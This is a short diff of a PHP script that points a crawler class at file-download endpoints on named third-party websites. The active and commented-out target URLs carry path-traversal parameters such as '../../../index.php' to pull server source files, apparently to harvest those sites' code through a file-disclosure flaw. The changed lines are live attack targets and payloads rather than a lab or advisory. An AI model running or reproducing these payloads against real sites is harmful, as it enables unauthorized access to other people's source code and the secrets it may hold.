@@ -12,8 +12,8 @@ require_once __DIR__ . '/vendor/autoload.php';
 
 $command=array();
 //$file="http://www.bva.com.es/servicios/ce/archivos/download.php?file=../../../index.php";
-$file="http://www.pcmodd.com.ar/downloadFile.php?file=index.php";
-//$file="http://uthgraloscocos.com.ar/site/descargar.php?ruta=..//site/index.php&archivo=";
+//$file="http://www.pcmodd.com.ar/downloadFile.php?file=index.php";
+$file="http://uthgraloscocos.com.ar/site/descargar.php?ruta=..//site/index.php&archivo=";
 $crawler = new CrawlerStaticFil($command,$file);
 
 $crawler->getAllFiles();
